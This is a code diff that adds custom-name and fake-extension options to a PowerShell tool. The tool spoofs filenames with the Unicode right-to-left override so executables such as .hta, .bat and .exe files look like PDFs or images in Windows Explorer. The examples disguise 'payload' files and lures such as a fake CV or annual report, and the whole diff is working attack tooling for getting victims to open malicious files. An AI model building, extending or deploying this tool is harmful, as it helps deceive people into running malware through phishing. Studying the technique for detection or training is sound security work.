@@ -33,6 +33,16 @@ Preview the output filename without creating any file.
 Print every available pattern with its global index, then exit.
 When combined with --file, only patterns for that extension are shown.
 
+.PARAMETER --name
+Custom base name for the output file, bypassing the predefined pattern list.
+Requires --fake-ext. Cannot be combined with --choice.
+Tip: avoid names ending in digits; BiDi weak-character rules may displace
+trailing digits into the RTL visual run (e.g. "cv2024" -> "cv.pdf2024").
+
+.PARAMETER --fake-ext
+Fake extension to display (without leading dot). Required with --name.
+Any alphanumeric extension is accepted: pdf, jpg, txt, csv, docx, etc.
+
 .PARAMETER --bidi-char
 Bidirectional control character to use for the override.
   rlo  U+202E  RIGHT-TO-LEFT OVERRIDE   (default; only char that produces visual spoof in Explorer)
@@ -60,9 +70,13 @@ Previews the filename without writing anything.
 PS C:\> .\MementoRTLO.ps1 --file payload.bat --replace
 Interactive selection, renames in place.
 
+.EXAMPLE
+PS C:\> .\MementoRTLO.ps1 --file cv_franck.hta --name cv_franck --fake-ext pdf
+Custom name: produces a file that appears as cv_franck.pdf in Explorer.
+
 .NOTES
 Author  : Franck FERMAN
-Version : 2.2.0
+Version : 2.3.0
 License : GNU AGPLv3
 GitHub  : https://github.com/franckferman/Memento-RTLO
 
@@ -188,11 +202,14 @@ function Show-Help {
     Write-Host ""
     Write-Host "Usage:" -ForegroundColor Yellow
     Write-Host "  .\MementoRTLO.ps1 --file <path> [--choice <N>] [--replace] [--dry-run]"
+    Write-Host "  .\MementoRTLO.ps1 --file <path> --name <basename> --fake-ext <ext> [--replace] [--dry-run]"
     Write-Host "  .\MementoRTLO.ps1 --show-list [--file <path>]"
     Write-Host ""
     Write-Host "Options:" -ForegroundColor Yellow
     Write-Host "  --file <path>          Source file to spoof (.exe/.hta/.bat/.vbs/.ps1)"
     Write-Host "  --choice <N>           Global pattern index from --show-list"
+    Write-Host "  --name <basename>      Custom output base name (bypasses --choice)"
+    Write-Host "  --fake-ext <ext>       Fake extension to display, e.g. pdf, jpg (requires --name)"
     Write-Host "  --replace              Rename in-place (default: create a copy)"
     Write-Host "  --dry-run              Preview output filename, no file written"
     Write-Host "  --show-list            List all available patterns with global indices"
@@ -208,6 +225,8 @@ function Show-Help {
     Write-Host "  .\MementoRTLO.ps1 --file payload.exe --choice 3 --dry-run"
     Write-Host "  .\MementoRTLO.ps1 --file payload.bat --replace"
     Write-Host "  .\MementoRTLO.ps1 --file payload.exe --choice 1 --bidi-char rli"
+    Write-Host "  .\MementoRTLO.ps1 --file cv_franck.hta --name cv_franck --fake-ext pdf"
+    Write-Host "  .\MementoRTLO.ps1 --file rapport.exe --name Rapport_annuel --fake-ext pdf --dry-run"
     Write-Host ""
     exit 0
 }
@@ -241,6 +260,8 @@ $Params = [ordered]@{
     DryRun   = $false
     ShowList = $false
     BidiChar = 'rlo'      # rlo (default) | rli | rle
+    Name     = $null      # custom basename — bypasses predefined patterns
+    FakeExt  = $null      # custom fake extension (no dot) — required with --name
 }
 
 $i = 0
@@ -261,6 +282,8 @@ while ($i -lt $args.Count) {
             }
             $Params.BidiChar = $bc
         }
+        '^--name$'     { $i++; $Params.Name = $args[$i] }
+        '^--fake-ext$' { $i++; $Params.FakeExt = $args[$i].TrimStart('.').ToLower() }
         default {
             Write-Host "Unknown argument: $($args[$i])" -ForegroundColor Yellow
         }
@@ -311,13 +334,41 @@ if ($Associations.Keys -notcontains $FileExt) {
 
 # ---------------------------------------------------------------------------
 # Pattern selection
-# --choice N  -> look up in the GLOBAL list; validate it matches $FileExt
-# (no --choice) -> interactive menu limited to the current extension's pairs
+# --name + --fake-ext -> fully custom pattern (bypasses predefined list)
+# --choice N          -> look up in the GLOBAL list; validate it matches $FileExt
+# (neither)           -> interactive menu limited to the current extension's pairs
 # ---------------------------------------------------------------------------
 $GlobalList = Get-GlobalList
 $Selected   = $null
 
-if ($null -ne $Params.Choice) {
+if ($Params.Name) {
+    # Custom mode: validate and build a synthetic pattern entry
+    if ($null -ne $Params.Choice) {
+        Write-Host "Error: --name and --choice are mutually exclusive." -ForegroundColor Red
+        exit 1
+    }
+    if (-not $Params.FakeExt) {
+        Write-Host "Error: --fake-ext <ext> is required with --name." -ForegroundColor Red
+        Write-Host "Example: --name cv_franck --fake-ext pdf" -ForegroundColor Gray
+        exit 1
+    }
+    if ($Params.FakeExt -notmatch '^[a-z0-9]{1,10}$') {
+        Write-Host "Error: --fake-ext must be alphanumeric, 1-10 chars (e.g. pdf, jpg, docx)." -ForegroundColor Red
+        exit 1
+    }
+    # Warn if name ends with a digit (BiDi weak-char displacement)
+    if ($Params.Name -match '\d$') {
+        Write-Host "Warning: --name ends with a digit; BiDi weak-char rules may displace it" -ForegroundColor Yellow
+        Write-Host "         visually (e.g. 'cv2024' -> 'cv.pdf2024'). Consider a trailing letter." -ForegroundColor Yellow
+        Write-Host ""
+    }
+    $Selected = [pscustomobject]@{
+        GlobalIndex = 0
+        RealExt     = $FileExt
+        Name        = $Params.Name
+        FakeExt     = $Params.FakeExt
+    }
+} elseif ($null -ne $Params.Choice) {
     # Resolve from global list
     $match = $GlobalList | Where-Object { $_.GlobalIndex -eq $Params.Choice }
     if (-not $match) {
@@ -362,11 +413,13 @@ $NewFileName = Build-Filename $Selected $FileExt
 $SourceDir   = (Get-Item $Params.File).DirectoryName
 $NewPath     = [System.IO.Path]::Combine($SourceDir, $NewFileName)
 
-$BidiLabel = @{ 'rlo' = 'U+202E RLO'; 'rli' = 'U+2067 RLI'; 'rle' = 'U+202B RLE' }[$Params.BidiChar]
+$BidiLabel    = @{ 'rlo' = 'U+202E RLO'; 'rli' = 'U+2067 RLI'; 'rle' = 'U+202B RLE' }[$Params.BidiChar]
+$PatternLabel = if ($Selected.GlobalIndex -eq 0) { "[custom] $($Selected.Name).$($Selected.FakeExt)" } `
+                else { "[$($Selected.GlobalIndex)] $($Selected.Name).$($Selected.FakeExt)  (for $FileExt)" }
 Show-Banner
 Write-Host ""
 Write-Host "  Source    : $($Params.File)" -ForegroundColor White
-Write-Host "  Pattern   : [$($Selected.GlobalIndex)] $($Selected.Name).$($Selected.FakeExt)  (for $FileExt)" -ForegroundColor White
+Write-Host "  Pattern   : $PatternLabel" -ForegroundColor White
 Write-Host "  Bidi char : $BidiLabel" -ForegroundColor White
 Write-Host "  Output    : $NewFileName" -ForegroundColor Green
 Write-Host ""
